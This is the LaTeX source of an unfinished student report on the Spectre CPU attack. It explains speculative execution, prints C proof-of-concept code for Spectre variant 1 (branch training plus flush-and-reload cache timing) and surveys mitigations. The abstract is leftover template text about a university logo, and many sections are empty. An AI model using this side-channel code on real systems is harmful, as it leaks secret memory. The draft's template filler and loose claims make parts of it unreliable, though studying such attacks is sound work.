\documentclass[12pt]{article}
\usepackage[toc,page]{appendix}
\usepackage[english]{babel}
\usepackage{natbib}
\usepackage{url}
\usepackage[utf8x]{inputenc}
\usepackage{amsmath}
\usepackage{graphicx}
\graphicspath{{images/}}
\usepackage{parskip}
\usepackage{fancyhdr}
\usepackage{vmargin}


\usepackage{xcolor}
\usepackage{listings}

\definecolor{mGreen}{rgb}{0,0.6,0}
\definecolor{mGray}{rgb}{0.5,0.5,0.5}
\definecolor{mPurple}{rgb}{0.58,0,0.82}
\definecolor{backgroundColour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{CStyle}{
    backgroundcolor=\color{backgroundColour},   
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    language=C
}


\setmarginsrb{3 cm}{2.5 cm}{3 cm}{2.5 cm}{1 cm}{1.5 cm}{1 cm}{1.5 cm}

\title{i7: Spectre and More}								% Title
\author{Sanchit Jain\\ Charith \\Rahul\\Suraj\\ Jeevitesh}								% Author
\date{\today}											% Date

\makeatletter
\let\thetitle\@title
\let\theauthor\@author
\let\thedate\@date
\makeatother

\pagestyle{fancy}
\fancyhf{}
% \rhead{\thechapter}
\lhead{\thetitle}
\cfoot{\thepage}


\begin{document}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{titlepage}
	\centering
    \vspace*{0.5 cm}
    \includegraphics[scale = 0.25]{logo.png}\\[1.0 cm]	% University Logo
    \textsc{\LARGE Indian Institute of Technology Bombay}\\[2.0 cm]	% University Name
	\textsc{\Large CS305/341}\\[0.5 cm]				% Course Code
	\textsc{\large  Computer Architecture}\\[0.5 cm]				% Course Name
	\rule{\linewidth}{0.2 mm} \\[0.4 cm]
	{ \huge \bfseries \thetitle}\\
	\rule{\linewidth}{0.2 mm} \\[1.5 cm]
	
	\begin{minipage}{0.4\textwidth}
		\begin{flushleft} \large
			\emph{Authors:}\\
			\theauthor
			\end{flushleft}
			\end{minipage}~
			\begin{minipage}{0.4\textwidth}
			\begin{flushright} \large
			\emph{Roll Number:} \\
			160050043\\
			160050083\\
			160050072\\
			1600500XX\\
			1600500XX\\% Your Student Number
		\end{flushright}
	\end{minipage}\\[2 cm]
	
	{\large \thedate}\\[2 cm]
 
	\vfill
	
\end{titlepage}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\tableofcontents
\pagebreak

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\section{Abstract}
\subsection{What is Spectre?}
This is a simple report template with the UCT logo. Feel free to use/modify it to suit your needs. Variables that need to be altered have been commented to make modifications easier. For example if you need to change the university logo, look for the comment \texttt{\% University Logo} in this file and then make appropriate modifications in that line.

A Table of Contents and a bibliography have also been implemented. To add entries to your bibliography, simply edit \texttt{biblist.bib} in the root folder and then use the \texttt{\textbackslash cite\{\ldots\}} command in \texttt{main.tex} \cite{bibtex}. The Table of Contents will be updated automatically.

I hope that you find this template both visually appealing and useful. \\
\subsection{Can someone Explain in Simple words?}
\subsection{Is is Really a ghost?}
\textbf{Yes!}

\section{Baby Steps/Background}
\subsection{Out of order Execution}
Out of order execution is a paradigm in which instructions are executed not in the order of how they appear but on the input data and execution units availiability to cpu for their execution. This is a commonly used approach in high performing processors. Clearly, this approach efficiently uses the instruction cycles and reduces the cost delay of executing a program.  
\subsubsection{More details}
The earlier processors( \textbf{in-order executive} ) differ from an \textbf{OoOE ( out of order executive)} processor in processing an instruction as follows. An inorder processor fetches the instruction, waits for it's inputs and availiability of execution units and then executes the instruction. It finally writes the result of instruction into the appropriate register in the register file. 

In contrast, OoOE processors breaks up the processing of instructions into these steps:
\begin{enumerate}
	\item Fetch the instruction.
	\item Dispatch it to an instruction queue.
	\item Executes the instructions in the queue based on the availiability of data and execution units.
	\item The results are queued and are written to the register file in the order of appearance.
\end{enumerate}

Note that the execution of instructions in step 3 doesn't follow the program order of instruction. 
This results in utilising, otherwise stalled clock cycles. The processor finally rearranges the result in the order of appearance to make it appear that it processed them in order. 

Further, modern processor uses some decoupling techinques such as renaming of registers and a certain \textbf{VLIW} architechture to effectively use this paradigm.

   The take away point is that modern processors are mostly OoOE and they execute instructions out of order for efficiency. 
  
\subsection{Speculation Execution}

When a processor encounters a branch instruction whose branching condition is not yet evaluated ( generally, because this instruction is being executed out of order), the \textbf{speculative execution paradigm} allows the processor to make a guess and take the branch and starts executing. \\
The cpu has to store it's register state before it speculatively executes. In case it comes to know that the branch it started evaluating isn't the right one, it reverts back to the saved state. With a good brach prediction algorithm, clearly, this paradigm greatly improves the execution time of a program with many branch instructions.  
\subsection{Branch Prediction}
\subsection{The Memory Hierarchy}
\subsection{Microarchitectural Side-Channel Attacks/Flush-Reload Techniques}
\subsection{Return Oriented Programming}
\section{What is Spectre? Why is it more famous than me?}
\subsection{General}
Spectre is a class of attacks that exploit security vulnerabilities in most modern processors. Specifically, the persistent effects (in cache) of speculative execution resulting from a branch mis-prediction are used to read data that is supposed to be inaccessible to the attacker. The assumption that speculative execution can be completely rolled back turns out to be wrong, and spectre attacks read this leaked data. There are several variants to spectre, we describe two of them below.
\subsection{Variant1 - Bounds Check Bypass}
\subsection{Varient2}
\subsection{Varient4}
\section{Our Result(Code+Result(screenshot))}
\section{Proof of Concept Study}
\section{The Experiment}
\subsection{Experiment Setup}
\subsubsection{Restricted Access}
\begin{lstlisting}[style=CStyle]
uint8_t restrictedAccess(size_t x)
{
	if (x < buffer_size) {
		return buffer[x];
	} 
	else {
		return 0;
	}
}
\end{lstlisting}
\subsubsection{Flush side channel}
\begin{lstlisting}[style=CStyle]
void flushSideChannel()
{
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 0;
		// Flush the values of the array from cache
	for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}
\end{lstlisting}

\subsubsection{Reload Side Channel}
\begin{lstlisting}[style=CStyle]
static int scores[256];
void reloadSideChannel()
{
	int i;
	volatile uint8_t* addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
		scores[i]++; 
	}
}
\end{lstlisting}

\subsubsection{Spectre Attack}
\begin{lstlisting}[style=CStyle]
void spectreAttack(size_t larger_x)
{
	int i;
	uint8_t s;
	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
	// Train the CPU to take the true branch inside victim().
	for (i = 0; i < 10; i++) {
		_mm_clflush(&buffer_size);
		restrictedAccess(i);
	}
	// Flush buffer_size and array[] from the cache.
	_mm_clflush(&buffer_size);
	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
	// Ask victim() to return the secret in out-of-order execution.
	s = restrictedAccess(larger_x);
	array[s*4096 + DELTA] += 88;
}
\end{lstlisting}

\subsection{Our Result}
\subsection{Our Technique}
\newpage
\section{Mitigations}
Several Solutions for Spectre attacks have been proposed. They rely on the basic architecture that Spectre exploits and try to catch hold of that at these \textbf{checkpoints}. Studying Mitigations is another very different perspective of understanding this attack. We discuss the extent of these mitigations on various dimensions such as \textbf{applicability}, \textbf{effectiveness} and \textbf{cost}.
\subsection{Preventing Speculative Execution}
A very simple approach to this is to prevent Speculative Execution altogether. Spectre relies heavily on speculative execution as seen in section 2.2 . Ensuring that an instruction is \textbf{executed only when control flow reaches}\ that instruction \textbf{eliminates Spectre}. Hence it is very effective in this sense.\\

 Note that we dont get this security for free. We have \textbf{traded speed for security} here. While effective as a countermeasure, preventing speculative execution would cause a \textbf{significant degradation} in the \textbf{performance} of the processor. This \textbf{limits its applicability}. \\

Current processors do \textbf{not} have software which can \textbf{issue commands} to disable speculative execution but they may like to include that in near future given the fact that discovery of this vulnerability is quite recent. Alternatively, some hardware products (such as embedded systems) could switch to alternate processor models that do not implement speculative execution. \\

Alternatively, the software could be modified to use serializing or speculation blocking instructions that ensure that instructions following them are not executed speculatively. Intel and AMD recommend the use of the \textbf{\textit{lfence}} instruction.\\

The above are some \textbf{cheap alternatives} to a very costly problem of updating the \textbf{software binaries} of legacy softwares.
\subsection{Preventing Access to Secret Data}
We can have a separate process which does the restricted tasks.Because Spectre attacks only leverage the victim’s permissions to access the data hence by isolating them using the process abstraction is a very elegant way to prevent access to secret data. Google Chrome opens each website as a seperate process for the same reason. This is arguably an efficient and cost effective way of defeating spectre which is applied in lots of real worls applications.
\subsubsection{More Info}
Two methods are employed for such preventions
\begin{itemize}
	\item \textbf{Replaces array bounds checking with index masking	:} Instead of checking that an array index is within bounds, we apply a bit mask to the index, ensuring that it is not much bigger than the array size. While masking may result in access outside the bounds of the array, this limits the distance of the bounds violation, preventing the attacker from accessing arbitrary memory. Hence secret data is effectively protected from the attacker.
	\item \textbf{protects access to pointers by xoring them with a pseudo-random poison values	:} Here if the poison value is not known to the attacker the pointer is of no use to him/her.More significantly, the poison value ensures that mispredictions on the branch instructions used for type checks will result in pointers associated with type being used for another type.
\end{itemize}
\subsection{Preventing Data from Entering Covert Channels}
Future processors could potentially track whether data was
fetched as the result of a speculative operation and, if so,
prevent that data from being used in subsequent operations
that might leak it. Current processors do not generally have
this capability, however.
\subsection{Limiting Data Extraction from Covert Channels}
\subsection{Preventing Branch Poisoning}
\section{Current Work Going On}
\section{Conclusion}
\section{Acknowledgement}
\newpage
\bibliographystyle{plain}
\bibliography{biblist}
\newpage
\begin{appendices}	
	\section{: Meltdown. Lets melt its cocoon}
	% the \\ insures the section title is centered below the phrase: AppendixA
	
	\textbf{PersonX}: Do you have a Sibling?\\
	
	\textbf{Spectre}: Ahh yes I have one named Meltdown\\
	
	\textbf{PersonX}: Can you tell us something about it?\\
	
	\textbf{Spectre}: Like every pair of Siblings we are from same Parents. The basic ideologies and mechanism through which we arise are the same. We both are based on Speculative Execution/Branch Prediction. But yet we are not the same. It is different from me in the following sense.
	
	\section{:  Onomastics of Spectre and Meltdown}
	% the \\ insures the section title is centered below the phrase: Appendix B
	
	\textbf{PersonX}: What was the reason that your parents chose these names for you?\\
	
	\textbf{Spectre}: Well I don't know. You should go and ask my parents I suppose. From what they have told me or what many believe is the following reason. For me it is because since my internals are based on \textbf{'Speculative Execution'}  so they wanted something similar sounding.\\ When I was born/discovered they knew I am very dangerous to a department called cyber security hence one of my parents \textbf{Paul Kocher} named me "Spectre" which really means a \textbf{ghost}. I not only was supposed to \textbf{haunt the cyber security proffessionals} but also was largely \textbf{invisible} to the ordinary program execution.\\
	
	\textbf{PersonX}: What about the naming of "Meltdown"?\\
	
	\textbf{Spectre}: The thinking of the name of "Meltdown" actually ironically haunts me and makes me really jealous. It is believed to be coined by one of my parent \textbf{Daniel Gruss} . The reason given for this coining of name was that since it \textbf{melts the boundary} \textbf{between programs} and \textbf{OS} it is aptly called "Meltdown". The name also made it sounds really devastating, with a huge impact, like an actual \textbf{meltdown in a nuclear reactor}.\\
	Moreover, in \textbf{German}, meltdown is \textbf{'Kernschmelze'}, which means \textbf{'melting of the core'}. Since we call the CPU as a core and indeed a 'CPU Kern' so it is also a wordplay, implying that the CPU is not in a good condition."
	
\end{appendices}
\end{document}